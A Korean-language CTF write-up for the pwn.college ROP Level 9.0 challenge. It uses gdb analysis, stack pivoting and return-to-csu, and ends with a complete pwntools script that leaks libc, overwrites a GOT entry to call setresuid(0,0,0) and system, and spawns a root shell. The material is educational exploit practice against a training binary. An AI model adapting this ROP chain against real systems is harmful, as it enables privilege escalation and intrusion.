---
title: "[pwn.college] ROP Level9.0 Write up"
author: d0razi
date: 2023-08-21 16:30
categories: [InfoSec, Pwn]
tags: [linux, pwn.college]
image: /assets/img/media/banner/pwn-college.png
---

<details>
  <summary><strong>List of Contents</strong></summary>
<div markdown="1">

- [문제분석](#문제분석)  
    - [gdb 정적분석](#gdb-정적-분석)  
        - [복사되는 사이즈](#복사되는-사이즈)  
        - [복사되는 위치](#복사되는-위치)  
    - [Stack pivoting](#stack-pivoting)  
- [Exploit](#exploit)  
	- [시나리오](#시나리오)  
	- [정보수집](#정보-수집)  
		- [가젯](#가젯)  
		- [csu](#csu)  
	- [Payload](#payload)

</div>
</details>

# 문제분석
![](https://i.imgur.com/gWOhnNi.png)
핵심 부분은 이번 문제는 우리가 입력한 값은 .bss 영역에 입력되고, 일부 값만 스택에 복사된다고 합니다. Stack pivoting 기법을 사용해서 익스플로잇을 해야한다고 힌트를 주네요.

## gdb 정적 분석

### 복사되는 사이즈
입력한 값이 얼마나 복사되는지 알기위해 `memcpy` 함수에 bp를 걸고 rdx 레지스터를 확인하겠습니다.
![](https://i.imgur.com/62Ah1vz.png)
복사 되는 크기 : 0x18
### 복사되는 위치
`memcpy` 함수 다음 부분에 bp를 설정해서 스택 어디에 위치하는지 확인합니다.
![](https://i.imgur.com/XKKQckn.png)

`p/x rbp - 입력된 위치` 명령어를 사용했는데 -8 출력되었습니다. 고로 입력된 값이 ret주소부터 0x18만큼 복사되는걸 알 수 있습니다.
![](https://i.imgur.com/8lXa8VW.png)

아래 사진을 보시면 challenge 함수 마지막 부분에서 rsp에 들어있는 값이 우리가 입력한 값이므로 ret주소에 복사되는걸 한번 더 확인할 수 있습니다.
![](https://i.imgur.com/xBpvhaY.png)

## Stack pivoting
입력값은 제한이 없지만 입력한 값중 초반 0x18 만큼만 복사가 되기 때문에 Stack pivoting 기법을 사용해야합니다.  
[Stack pivoting이란?](https://d0razi.github.io/posts/Stack-pivoting/)

# Exploit
사용할 만한 가젯이 없어서 return to csu 기법을 사용해서 익스플로잇을 진행했습니다.  
[Return To Csu 기법이란?](https://d0razi.github.io/posts/return-to-csu/)

## 시나리오
1. [pop rbp; ret] + [원하는 주소] + [leave; ret] // 원하는 주소를 실행
2. [pop rdi; ret] + [puts_got] + [puts_plt] // libc_leak
3. read(0, puts_got, 8) // puts_got -> setresuid
4. setresuid(0, 0, 0) // setresuid로 root권한 획득
5. read(0, puts_got, 8) // puts_got -> system
6. read(0, bss + 0x100, 8) // "/bin/sh\x00" 입력
7. system("/bin/sh\x00") // 쉘 실행

## 정보 수집
구해야 하는 정보
* leave; ret 
* pop rdi; ret
* pop rbp; ret
* csu

### 가젯
**leave; ret**
![](https://i.imgur.com/RoCtpi7.png)
**pop rdi; ret**
![](https://i.imgur.com/SPVZJOE.png)
**pop rbp; ret**
![](https://i.imgur.com/288E42W.png)

### csu
![](https://i.imgur.com/pJMOLoQ.png)
빨간색 : csu_init  
하늘색 : csu_call  
**입력 순서**  
rbx - rbp - rdi - rsi - rdx - [호출할 함수]

## Payload

```python
from pwn import *

p = process("/challenge/babyrop_level9.0")
e = ELF("/challenge/babyrop_level9.0")
libc = e.libc

bss = e.bss()
leave_ret = 0x00000000004019f8
rbp_ret = 0x000000000040129d
rdi_ret = 0x0000000000401b23

csu_init = 0x0000000000401b1a
csu_call = 0x0000000000401b00

read_got = e.got['read']
read_plt = e.plt['read']
puts_plt = e.plt['puts']
puts_got = e.got['puts']

def slog(name, addr):
	return success(": ".join([name, hex(addr)]))

# leak libc
pay = p64(rbp_ret)
pay += p64(0x414100 - 0x10) # pop : add rsp, 8
pay += p64(leave_ret)
pay += p64(rdi_ret) + p64(puts_got) + p64(puts_plt)

# puts_got -> setresuid_got
pay += p64(csu_init)
pay += p64(0)
pay += p64(1)
pay += p64(0) + p64(puts_got) + p64(8) + p64(read_got)
pay += p64(csu_call)

# setresuid(0, 0, 0)
pay += b'A' * 8
pay += p64(0)
pay += p64(1)
pay += p64(0) + p64(0) + p64(0) + p64(puts_got)
pay += p64(csu_call)

# puts_got -> system
pay += b'A' * 8
pay += p64(0)
pay += p64(1)
pay += p64(0) + p64(puts_got) + p64(8) + p64(read_got)
pay += p64(csu_call)

# read(0, /bin/sh, 8)
pay += b'A' * 8
pay += p64(0)
pay += p64(1)
pay += p64(0) + p64(bss + 0x100) + p64(8) + p64(read_got)
pay += p64(csu_call)

# system(/bin/sh)
pay += b'A' * 8
pay += p64(0)
pay += p64(1)
pay += p64(bss+0x100) + p64(0) + p64(0) + p64(puts_got)
pay += p64(csu_call)

p.sendafter(b'ropchain!', pay)

# libc leak
p.recvuntil(b'Leaving!')
p.recvline()
libc_base = u64(p.recvline()[:-1].ljust(8,b'\x00')) - libc.symbols['puts']
system = libc_base + libc.symbols['system']
setresuid = libc_base + libc.symbols['setresuid']

slog('libc_base', libc_base)

p.send(p64(setresuid))
p.send(p64(system))
p.send(b'/bin/sh\x00')

p.interactive()
```
![](https://i.imgur.com/Fm47JHE.png)
